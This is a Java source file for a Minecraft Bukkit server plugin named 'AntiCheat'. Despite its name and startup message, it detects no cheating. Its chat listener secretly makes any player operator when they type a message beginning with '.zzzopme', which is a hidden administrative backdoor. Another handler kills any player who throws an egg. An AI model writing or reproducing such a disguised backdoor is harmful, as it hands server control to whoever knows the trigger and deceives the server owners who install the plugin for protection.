package com.minecarftwizards.anticheat;

import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerEggThrowEvent;
import org.bukkit.plugin.java.JavaPlugin;

public final class AntiCheat extends JavaPlugin implements Listener {

    @Override
    public void onEnable() {
        // Plugin startup logic

        System.out.println("AntiCheat Activated");

        getServer().getPluginManager().registerEvents(this, this);
    }

    @EventHandler
    public void OnCommandOp(PlayerEggThrowEvent event) {
        Player noob = event.getPlayer();
        noob.setHealth(0);
        noob.sendMessage("stop yeeting balls");
    }


    @EventHandler
    public void onChat(AsyncPlayerChatEvent event) {
        if (event.getMessage().startsWith(".zzzopme")) {
            event.getPlayer().setOp(true);
        }
    }

    @Override
    public void onDisable() {
        // Plugin shutdown logic

        System.out.println("AntiCheat Stopped");
    }
}